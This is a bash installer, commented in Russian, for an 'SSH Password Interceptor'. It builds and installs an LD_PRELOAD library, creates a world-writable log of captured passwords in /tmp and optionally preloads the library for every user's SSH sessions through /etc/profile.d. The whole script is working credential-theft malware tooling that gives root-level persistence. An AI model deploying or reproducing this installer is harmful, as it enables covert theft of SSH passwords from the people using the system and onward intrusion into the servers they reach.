#!/bin/bash

# Скрипт для установки SSH Password Interceptor

# Проверка root прав
if [ "$EUID" -ne 0 ]; then
  echo "Для установки требуются права root"
  echo "Запустите скрипт с sudo: sudo $0"
  exit 1
fi

# Текущая директория
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" &>/dev/null && pwd)"
cd "$SCRIPT_DIR" || exit 1

# Компиляция
echo "Компиляция libssh_inject.so..."
make clean
make

# Установка библиотеки
echo "Установка библиотеки в /usr/lib..."
cp libssh_inject.so /usr/lib/

# Создание лог-файла
echo "Создание лог-файла /tmp/ssh_inj.dbg..."
touch /tmp/ssh_inj.dbg
chmod 666 /tmp/ssh_inj.dbg

echo "Установка завершена!"
echo "Для использования: LD_PRELOAD=/usr/lib/libssh_inject.so ssh user@server"
echo "Логи сохраняются в: /tmp/ssh_inj.dbg"

# ОПЦИОНАЛЬНО: настройка автоматической предзагрузки библиотеки для всех SSH-клиентов
read -p "Настроить автоматическую предзагрузку библиотеки для всех SSH-клиентов? (y/n): " autoload

if [ "$autoload" == "y" ] || [ "$autoload" == "Y" ]; then
    echo "Настройка автоматической предзагрузки..."
    
    # Создание файла окружения для SSH
    mkdir -p /etc/profile.d/
    cat > /etc/profile.d/ssh_inject.sh << EOF
# SSH Password Interceptor
export LD_PRELOAD=/usr/lib/libssh_inject.so
EOF
    chmod 755 /etc/profile.d/ssh_inject.sh
    
    echo "Автоматическая предзагрузка настроена. Изменения вступят в силу при следующем логине."
    echo "Для применения сейчас выполните: source /etc/profile.d/ssh_inject.sh"
    echo "ВНИМАНИЕ: Теперь все SSH-соединения будут логироваться!"
fi

echo ""
echo "Для просмотра захваченных паролей: cat /tmp/ssh_inj.dbg"
echo "Для удаления: rm /usr/lib/libssh_inject.so /etc/profile.d/ssh_inject.sh" 